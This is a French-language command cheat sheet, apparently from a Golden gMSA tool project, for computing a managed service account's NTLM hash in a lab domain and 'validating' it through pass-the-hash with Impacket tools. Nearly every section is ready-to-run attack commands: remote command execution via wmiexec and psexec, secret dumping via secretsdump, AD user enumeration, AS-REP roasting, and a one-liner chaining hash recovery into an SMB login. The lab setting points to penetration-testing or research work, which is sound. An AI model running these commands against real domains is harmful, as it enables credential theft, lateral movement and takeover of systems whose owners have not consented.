# Validation Rapide des Hashes NTLM - Commandes Prêtes à l'Emploi

## 🚀 Récupération Rapide du Hash NTLM

```bash
cd /home/felix/Desktop/goldenGMSA/golden_gmsa_python
source venv/bin/activate

# Mode en ligne (recommandé)
python3 main.py -u Administrateur -p 'Password1' -d lab.local --dc-ip 172.31.124.12 \
  compute --sid S-1-5-21-4163040651-2381858556-3943169962-1104 | \
  grep "NTLM Hash (NT only):" | awk '{print $4}'
```

**Sortie**: Hash NT (32 caractères hex), ex: `c0c4058cba95fd028c947d0c65e8b19d`

---

## ✅ Commandes de Validation avec Impacket

### Prerequisites
```bash
# Définir le hash (remplacez par votre hash récupéré)
NT_HASH="c0c4058cba95fd028c947d0c65e8b19d"
HASH_FULL="aad3b435b51404eeaad3b435b51404ee:$NT_HASH"
```

### 1. smbclient.py (Accès SMB)
```bash
python3 venv/bin/smbclient.py \
  -hashes "$HASH_FULL" \
  lab.local/svc_test\$@172.31.124.12
```
**Commande dans smbclient**: `ls`, `exit`

### 2. wmiexec.py (Execution commandes WMI)
```bash
python3 venv/bin/wmiexec.py \
  -hashes "$HASH_FULL" \
  lab.local/svc_test\$@172.31.124.12 \
  'whoami'
```

### 3. psexec.py (PsExec)
```bash
python3 venv/bin/psexec.py \
  -hashes "$HASH_FULL" \
  lab.local/svc_test\$@172.31.124.12 \
  'whoami'
```

### 4. secretsdump.py (Dump secrets)
```bash
python3 venv/bin/secretsdump.py \
  -hashes "$HASH_FULL" \
  lab.local/svc_test\$@172.31.124.12 \
  -target-ip 172.31.124.12
```

### 5. GetADUsers.py (Énumération AD)
```bash
python3 venv/bin/GetADUsers.py \
  -hashes "$HASH_FULL" \
  lab.local/svc_test\$ \
  -dc-ip 172.31.124.12
```

### 6. GetNPUsers.py (AS-REP Roasting)
```bash
python3 venv/bin/GetNPUsers.py \
  -hashes "$HASH_FULL" \
  lab.local/svc_test\$ \
  -dc-ip 172.31.124.12
```

---

## 📝 One-Liner Complet

```bash
# Récupérer et tester en une commande
python3 main.py -u Administrateur -p 'Password1' -d lab.local --dc-ip 172.31.124.12 \
  compute --sid S-1-5-21-4163040651-2381858556-3943169962-1104 | \
  grep "NTLM Hash (NT only):" | awk '{print $4}' | \
  xargs -I {} python3 venv/bin/smbclient.py \
    -hashes "aad3b435b51404eeaad3b435b51404ee:{}" \
    lab.local/svc_test\$@172.31.124.12
```

---

## 🔧 Script Automatique

Utilisez le script de validation automatique:

```bash
python3 validate_hash.py
```

Ce script teste automatiquement tous les outils impacket disponibles.

---

## ⚠️ Notes Importantes

1. **Hash expiré**: Les gMSA changent de mot de passe toutes les 30 jours
   - ✅ Recalculer le hash si vous obtenez `STATUS_LOGON_FAILURE`
   
2. **Format requis**: Impacket nécessite `LM:NT`
   - Hash LM vide: `aad3b435b51404eeaad3b435b51404ee`
   - Format: `aad3b435b51404eeaad3b435b51404ee:{NT_HASH}`

3. **Permissions**: Le compte gMSA peut ne pas avoir les permissions pour certains outils
   - smbclient.py: Nécessite accès SMB
   - wmiexec.py: Nécessite WMI activé
   - secretsdump.py: Nécessite permissions élevées

---

**Dernière mise à jour**: 2025-11-02

